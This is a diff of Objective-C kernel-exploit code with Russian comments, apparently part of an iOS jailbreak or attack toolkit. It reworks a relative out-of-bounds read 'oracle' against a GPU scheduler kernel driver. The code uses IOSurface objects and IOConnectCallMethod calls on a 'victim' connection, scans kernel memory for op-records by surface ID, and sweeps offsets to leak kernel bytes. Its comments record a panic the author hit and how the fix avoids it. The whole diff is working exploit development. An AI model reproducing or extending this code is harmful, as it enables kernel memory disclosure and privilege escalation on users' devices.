@@ -4334,7 +4334,8 @@ static void *kpM2TDriverMain(void *arg)
 // Значит: credit = смещение → байт из [sched+0x118+смещение] аккумулируется
 // в НАШЕЙ же op-записи → читаем её kread'ом = относительный OOB-read
 // (+0..+4GB от scheduler'а), второй leak-канал, независимый от ClearSword.
-// Метод: discovery (driver → scheduler → entry array → entry VA по маркеру)
+// Метод: discovery (driver → scheduler → entry array → entry VA по уникальному
+// srcID; credit при discovery = 0x10 — маркер в credit = бомба, паника 0639)
 // → oracle-свип смещений с валидацией против прямого kread.
 
 static BOOL gM2OLive = NO;
@@ -4386,6 +4387,40 @@ static BOOL kpM2OMarkerAt(uint64_t va, uint32_t off, uint32_t marker, NSMutableS
     uint32_t v = 0;
     return kpLooksLikeKernelPointer(va) &&
            kpRead(va + off, &v, 4, "m2o marker@", r) && v == marker;
+}
+
+// Сбор указателей op-записей из entry-array scheduler'а: +0xc8 — указатель на
+// массив ИЛИ inline-массив (проверяем оба). Возвращает число собранных.
+static uint32_t kpM2OCollectEntries(uint64_t schedVA, uint64_t *eptrs, uint32_t cap, NSMutableString *r)
+{
+    uint32_t eN = 0;
+    uint64_t cnt = 0, arr = 0;
+    kpRead(schedVA + 0xb8, &cnt, 8, "m2o cnt", r);
+    kpRead(schedVA + 0xc8, &arr, 8, "m2o arr", r);
+    arr = kp_untag_ptr(arr);
+    if (kpLooksLikeKernelPointer(arr) && cnt && cnt <= cap) {
+        uint8_t abuf[128 * 8];
+        memset(abuf, 0, sizeof(abuf));
+        if (kpRead(arr, abuf, cnt * 8, "m2o array", r))
+            for (uint32_t i = 0; i < cnt; i++) {
+                uint64_t q = 0;
+                memcpy(&q, abuf + i * 8, 8);
+                uint64_t p = kp_untag_ptr(q);
+                if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+            }
+    }
+    if (!eN) {
+        uint8_t ibuf[0x100];
+        memset(ibuf, 0, sizeof(ibuf));
+        if (kpRead(schedVA + 0xc8, ibuf, sizeof(ibuf), "m2o inline", r))
+            for (uint32_t o = 0; o + 8 <= sizeof(ibuf) && eN < 16; o += 8) {
+                uint64_t q = 0;
+                memcpy(&q, ibuf + o, 8);
+                uint64_t p = kp_untag_ptr(q);
+                if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+            }
+    }
+    return eN;
 }
 
 + (NSString *)m2OracleReport
@@ -4470,15 +4505,20 @@ static BOOL kpM2OMarkerAt(uint64_t va, uint32_t off, uint32_t marker, NSMutableS
     if (!schedVA)
         kpM2ONote(r, @"  scheduler по layout не найден — oracle-фаза пропущена, только discovery");
 
-    // ---- victim маркер + async → op-записи несут credit @ +0xc3c ----
+    // ---- discovery op-записей. УРОК паники 0639: маркер в credit = БОМБА ----
+    // (credit — живой индекс ldrb [sched+0x118+credit]; 0xCAFE7777 = +3.2GB =
+    // мгновенный краш на pass'е). Поэтому: credit держим БЕЗОПАСНЫМ (0x10),
+    // записи опознаём по уникальному srcID отдельной discovery-поверхности.
     NSDictionary *sp5 = @{(__bridge id)kIOSurfaceWidth:@(32), (__bridge id)kIOSurfaceHeight:@(32),
                           (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
     IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
     IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
-    if (!srcS || !dstS) {
+    IOSurfaceRef discS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
+    if (!srcS || !dstS || !discS) {
         kpM2ONote(r, @"  IOSurfaceCreate NULL — SKIP");
         if (srcS) CFRelease(srcS);
         if (dstS) CFRelease(dstS);
+        if (discS) CFRelease(discS);
         IOServiceClose(victim);
         IOObjectRelease(svc);
         gM2OLive = NO;
@@ -4486,94 +4526,94 @@ static BOOL kpM2OMarkerAt(uint64_t va, uint32_t off, uint32_t marker, NSMutableS
     }
     uint32_t srcID = IOSurfaceGetID(srcS);
     uint32_t dstID = IOSurfaceGetID(dstS);
+    uint32_t discSrcID = IOSurfaceGetID(discS);
 
     uint8_t s10[0x18];
     memset(s10, 0, sizeof(s10));
-    *(uint32_t *)s10 = 0xCAFE7777;
+    *(uint32_t *)s10 = 0x10;   // безопасный credit: чтение sched+0x128, mapped
     uint64_t sc[3] = {0, 0, 0};
     kern_return_t ckr = IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
 
-    uint8_t tsd[KP_M2_TSD_SIZE];
-    memset(tsd, 0, sizeof(tsd));
-    *(uint32_t *)(tsd + 0x000) = srcID;
-    *(uint32_t *)(tsd + 0x004) = dstID;
-    *(uint64_t *)(tsd + 0x008) = 1;
+    uint8_t tsdD[KP_M2_TSD_SIZE];
+    memset(tsdD, 0, sizeof(tsdD));
+    *(uint32_t *)(tsdD + 0x000) = discSrcID;
+    *(uint32_t *)(tsdD + 0x004) = dstID;
+    *(uint64_t *)(tsdD + 0x008) = 1;
     for (int i = 0; i < 8; i++)
-        IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
-    kpM2ONote(r, [NSString stringWithFormat:@"  victim credit=0xCAFE7777 (kr=0x%x) + 8 async — ищу op-записи", ckr]);
+        IOConnectCallMethod(victim, 1, NULL, 0, tsdD, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    kpM2ONote(r, [NSString stringWithFormat:@"  victim credit=0x10 (kr=0x%x) + 8 async с discSrcID=%u — ищу op-записи по srcID", ckr, discSrcID]);
 
-    // entry-array: +0xc8 может быть указателем на массив ИЛИ inline-массивом —
-    // проверяем обе интерпретации, записи опознаём по маркеру на +0xc3c.
     uint64_t entryVA = 0;
     if (schedVA) {
-        uint64_t cnt = 0, arr = 0;
-        kpRead(schedVA + 0xb8, &cnt, 8, "m2o cnt", r);
-        kpRead(schedVA + 0xc8, &arr, 8, "m2o arr", r);
-        arr = kp_untag_ptr(arr);
         uint64_t eptrs[128];
-        uint32_t eN = 0;
-        if (kpLooksLikeKernelPointer(arr) && cnt && cnt <= 128) {
-            uint8_t abuf[128 * 8];
-            memset(abuf, 0, sizeof(abuf));
-            if (kpRead(arr, abuf, cnt * 8, "m2o array", r))
-                for (uint32_t i = 0; i < cnt; i++) {
-                    uint64_t q = 0;
-                    memcpy(&q, abuf + i * 8, 8);
-                    uint64_t p = kp_untag_ptr(q);
-                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
+        uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
+        kpM2ONote(r, [NSString stringWithFormat:@"  entry-array: указателей собрано=%u — скан 0x2200 на srcID + проверка +0xc3c==0x10", eN]);
+        for (uint32_t i = 0; i < eN && !entryVA; i++) {
+            uint8_t ebuf[0x2200];
+            memset(ebuf, 0, sizeof(ebuf));
+            if (!kpRead(eptrs[i], ebuf, sizeof(ebuf), "m2o entry scan", r)) continue;
+            for (uint32_t o = 0; o + 4 <= sizeof(ebuf); o += 4) {
+                uint32_t v = 0;
+                memcpy(&v, ebuf + o, 4);
+                if (v != discSrcID) continue;
+                if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) {
+                    entryVA = eptrs[i];
+                    kpM2ONote(r, [NSString stringWithFormat:@"  ★ op-запись @ %#llx: srcID на +%#x, credit +0xc3c=0x10 подтверждён",
+                                  (unsigned long long)entryVA, o]);
                 }
-        }
-        // inline-вариант: указатели прямо в scheduler'е
-        if (!eN) {
-            uint8_t ibuf[0x100];
-            memset(ibuf, 0, sizeof(ibuf));
-            if (kpRead(schedVA + 0xc8, ibuf, sizeof(ibuf), "m2o inline", r))
-                for (uint32_t o = 0; o + 8 <= sizeof(ibuf) && eN < 16; o += 8) {
-                    uint64_t q = 0;
-                    memcpy(&q, ibuf + o, 8);
-                    uint64_t p = kp_untag_ptr(q);
-                    if (kpLooksLikeKernelPointer(p)) eptrs[eN++] = p;
-                }
-        }
-        kpM2ONote(r, [NSString stringWithFormat:@"  entry-array: count=%llu, указателей собрано=%u — проверяю +0xc3c", (unsigned long long)cnt, eN]);
-        for (uint32_t i = 0; i < eN; i++) {
-            if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0xCAFE7777, r)) {
-                entryVA = eptrs[i];
-                kpM2ONote(r, [NSString stringWithFormat:@"  ★ op-запись с нашим маркером @ %#llx (credit +0xc3c подтверждён)", (unsigned long long)entryVA]);
                 break;
             }
         }
         if (!entryVA)
-            kpM2ONote(r, @"  маркер 0xCAFE7777 ни в одной записи массива — записи дренулись/другой layout");
+            kpM2ONote(r, @"  записи с discSrcID не найдены в массиве — дренулись до скана / scheduler не тот");
     }
 
-    // ---- oracle: credit = смещение, читаем байт из [sched+0x118+credit] ----
+    // ---- oracle: credit = смещение → байт [sched+0x118+credit] → entry+0xbc4 ----
     if (schedVA && entryVA) {
-        kpM2ONote(r, @"--- ORACLE: свип смещений (delta entry+0xbc4 vs прямой kread sched+0x118+T) ---");
+        kpM2ONote(r, @"--- ORACLE: свип смещений (каждая итерация находит СВЕЖУЮ запись с credit=T) ---");
         io_connect_t churn = IO_OBJECT_NULL;
         IOServiceOpen(svc, mach_task_self(), 0, &churn);
-        const uint32_t offsets[] = { 0x0, 0x8, 0x10, 0x40, 0x100, 0x400, 0x1000, 0x4000 };
+        if (churn != IO_OBJECT_NULL) {
+            memset(s10, 0, sizeof(s10));
+            *(uint32_t *)s10 = 0x30;   // churn-credit отличен от всех T
+            IOConnectCallMethod(churn, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+        }
+        uint8_t tsd[KP_M2_TSD_SIZE];
+        memset(tsd, 0, sizeof(tsd));
+        *(uint32_t *)(tsd + 0x000) = srcID;
+        *(uint32_t *)(tsd + 0x004) = dstID;
+        *(uint64_t *)(tsd + 0x008) = 1;
+        const uint32_t offsets[] = { 0x8, 0x18, 0x28, 0x40, 0x100, 0x400, 0x1000, 0x4000 };
         for (int t = 0; t < 8; t++) {
             uint32_t T = offsets[t];
-            // свежая запись с credit=T
             memset(s10, 0, sizeof(s10));
             *(uint32_t *)s10 = T;
             IOConnectCallMethod(victim, 10, sc, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+            IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+            // свежая запись с credit==T (прошлая дренулась за миллисекунды)
+            uint64_t eptrs[128];
+            uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
+            uint64_t eVA = 0;
+            for (uint32_t i = 0; i < eN; i++) {
+                if (kpM2OMarkerAt(eptrs[i], 0xc3c, T, r)) { eVA = eptrs[i]; break; }
+            }
+            if (!eVA) {
+                kpM2ONote(r, [NSString stringWithFormat:@"  T=%#06x: запись не найдена в массиве (дренаж) — пропуск", T]);
+                continue;
+            }
             uint64_t baseCnt = 0;
-            kpRead(entryVA + 0xbc4, &baseCnt, 8, "m2o bc4 base", r);
-            for (int i = 0; i < 4; i++)
-                IOConnectCallMethod(victim, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
-            // гоним pass: churn-сабмиты заставляют pass перечитывать массив
+            kpRead(eVA + 0xbc4, &baseCnt, 8, "m2o bc4 base", r);
             for (int i = 0; i < 40 && churn != IO_OBJECT_NULL; i++)
                 IOConnectCallMethod(churn, 1, NULL, 0, tsd, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
-            usleep(3000);
+            usleep(2000);
             uint64_t nowCnt = 0;
-            kpRead(entryVA + 0xbc4, &nowCnt, 8, "m2o bc4 now", r);
+            kpRead(eVA + 0xbc4, &nowCnt, 8, "m2o bc4 now", r);   // freed-слот читается безопасно (зона)
             uint8_t direct = 0;
             BOOL dok = kpRead(schedVA + 0x118 + T, &direct, 1, "m2o direct", r);
             long long delta = (long long)(nowCnt - baseCnt);
-            kpM2ONote(r, [NSString stringWithFormat:@"  T=%#06x: entry+0xbc4 delta=%lld, прямой байт=%#04x %@ %@",
-                          T, delta, direct, dok ? @"" : @"(kread fail)",
+            kpM2ONote(r, [NSString stringWithFormat:@"  T=%#06x: entry @ %#llx +0xbc4 delta=%lld, прямой байт=%#04x %@ %@",
+                          T, (unsigned long long)eVA, delta, direct, dok ? @"" : @"(kread fail)",
                           (dok && delta != 0 && direct != 0 && delta % direct == 0) ? @"★ ORACLE MATCH" :
                           (dok && direct == 0 && delta == 0) ? @"★ ноль-контроль OK" : @"—"]);
         }
@@ -4584,6 +4624,7 @@ static BOOL kpM2OMarkerAt(uint64_t va, uint32_t off, uint32_t marker, NSMutableS
     kpM2ONote(r, @"=== oracle завершён (паника здесь НЕ нужна: управляемое чтение вместо краша) ===");
     CFRelease(srcS);
     CFRelease(dstS);
+    CFRelease(discS);
     IOServiceClose(victim);
     IOObjectRelease(svc);
     gM2OLive = NO;
